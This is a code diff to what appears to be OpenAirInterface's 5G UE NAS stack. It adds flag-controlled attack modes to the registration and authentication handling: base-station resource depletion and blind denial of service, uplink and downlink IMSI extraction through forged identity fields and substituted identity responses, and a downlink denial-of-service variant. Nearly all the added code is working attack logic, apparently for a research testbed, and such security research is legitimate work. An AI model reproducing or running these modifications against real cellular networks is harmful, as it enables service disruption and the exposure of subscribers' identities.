@@ -53,6 +53,8 @@
 #include "openair3/SECU/nas_stream_eia2.h"
 #include "openair3/UTILS/conversions.h"
 
+#include "attack_extern.h"      /* bts_attack, blind_dos_attack, dnlink_dos_attack, dnlnk_imsi_extract */
+
 uint8_t  *registration_request_buf;
 uint32_t  registration_request_len;
 extern char *baseNetAddress;
@@ -445,7 +447,18 @@ void generateRegistrationRequest(as_nas_info_t *initialNasMsg, nr_ue_nas_t *nas)
   mm_msg->registration_request.fgsregistrationtype = INITIAL_REGISTRATION;
   mm_msg->registration_request.naskeysetidentifier.naskeysetidentifier = 1;
   size += 1;
-  if(nas->guti){
+  if (uplnk_imsi_extract /* != 0 */) {
+    // fill invalid S-TMSI
+    LOG_E(NAS, "[Uplink IMSI Extractor] Variant 1: encoding invalid TMSI into registration message\n");
+    FGSMobileIdentity *mi = &mm_msg->registration_request.fgsmobileidentity;
+    mi->guti.typeofidentity = FGS_MOBILE_IDENTITY_5G_GUTI;
+    mi->stmsi.spare       = 0;
+    mi->stmsi.amfsetid    = 0;
+    mi->stmsi.amfpointer  = 0;
+    mi->stmsi.tmsi        = 0;
+    size += sizeof(Stmsi5GSMobileIdentity_t);
+  }
+  else if(nas->guti){
     size += fill_guti(&mm_msg->registration_request.fgsmobileidentity, nas->guti);
   } else {
     size += fill_suci(&mm_msg->registration_request.fgsmobileidentity, nas->uicc);
@@ -1215,7 +1228,41 @@ void *nas_nrue(void *args_p)
             generateIdentityResponse(&initialNasMsg, *(pdu_buffer + 3), nas->uicc);
             break;
           case FGS_AUTHENTICATION_REQUEST:
-            generateAuthenticationResp(nas, &initialNasMsg, pdu_buffer);
+            // BTS resource depletion attack
+            if (bts_attack >= 5 || blind_dos_attack /* > 0 */) {
+              const char *_logEAtt;
+              const char *_logIAtt;
+
+              if (blind_dos_attack /* > 0 */) {
+                _logEAtt = "BLIND_DOS_ATTACK_ITEM_04";
+                _logIAtt = "Blind DOS";
+              }
+              else {
+                _logEAtt = "BTS_ATTACK_ITEM_04";
+                _logIAtt = "BTS Resource Depletion";
+              }
+
+              LOG_E(NAS, "[%s]: UE receiving authentication request, control hand back to RRC\n", _logEAtt);
+
+              MessageDef *msg = itti_alloc_new_message(TASK_NAS_NRUE, 0, NAS_UPLINK_DATA_REQ);
+              ul_info_transfer_req_t *req = &NAS_UPLINK_DATA_REQ(msg);
+              req->UEid = -1; // use -1 as pivot value to communicate
+              req->nasMsg.data = NULL;
+              req->nasMsg.length = -1;
+              itti_send_msg_to_task(TASK_RRC_NRUE, -1, msg);
+            }
+            else if (dnlnk_imsi_extract == 1) {
+              LOG_E(NAS, "[Downlink IMSI Extractor] Variant 1: replacing Authentication Request with Identity Request (IMSI)\n");
+              generateIdentityResponse(&initialNasMsg, FGS_MOBILE_IDENTITY_SUCI, nas->uicc); // handle it as an identity request
+            }
+            else if (dnlink_dos_attack == 1) {
+              LOG_E(NAS, "[Downlink DoS] Variant 1: Replacing Authentication Request with Registration Reject\n");
+              break;
+            }
+            else {
+              LOG_E(NAS, "[BTS_NOT_ATTACK]: UE receiving authentication request, normal processing\n");
+              generateAuthenticationResp(nas, &initialNasMsg, pdu_buffer);
+            }
             break;
           case FGS_SECURITY_MODE_COMMAND:
             nas_itti_kgnb_refresh_req(instance, nas->security.kgnb);
